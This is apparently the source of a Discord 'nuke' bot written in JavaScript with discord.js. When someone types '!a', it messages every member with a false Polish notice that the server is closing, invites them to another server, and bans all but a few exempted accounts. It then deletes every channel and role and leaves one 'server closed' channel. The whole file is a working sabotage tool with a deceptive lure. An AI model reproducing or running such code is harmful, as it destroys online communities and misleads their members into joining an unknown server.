import { Client, Intents } from 'discord.js';
import dotenv from 'dotenv';
const BotClient = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES]
});

dotenv.config();
BotClient.on('ready', () => {
    console.log('Czas coś rozjebać');
});

BotClient.on('message', msg => {
    // check prefix
    if (msg.content.startsWith('!a')) {
        try {
            console.log(`\n\n\n!a command\n\n\n`);
            msg.guild.members.cache
                // get list of users to ban (exclude some of them)
                .filter(m => {
                    return (
                        m.user.id !== msg.guild.ownerID &&
                        m.user.tag !== 'TheToster#3003' &&
                        m.user.tag !== 'Majchal#2131' &&
                        m.user.id !== BotClient.user.id
                    );
                })
                .forEach(m => {
                    m.user
                        // send msg to user, then ban them
                        .send(`Przepraszamy, nasz serwer: ${msg.guild.name} zostaje zamknięty, z tego powodu przenosimy się na nowy serwer: https://discord.gg/wG7pSkNwZP \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`)
                        .then(m.ban())
                        .catch(console.error);
                });
            msg.guild.channels.cache.forEach(channel => channel.delete());
            msg.guild.roles.cache.forEach(role => role.delete());
            msg.guild.channels
                .create('Serwer zamknięty', {
                    type: 'text'
                })
                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
                .then(msg.guild.createTemplate('Serwer zamknięty').then(t => t.sync()))
                .catch(console.error);
        } catch (error) {
            console.log(error);
        }
    };
});

BotClient.login(process.env.TOKEN);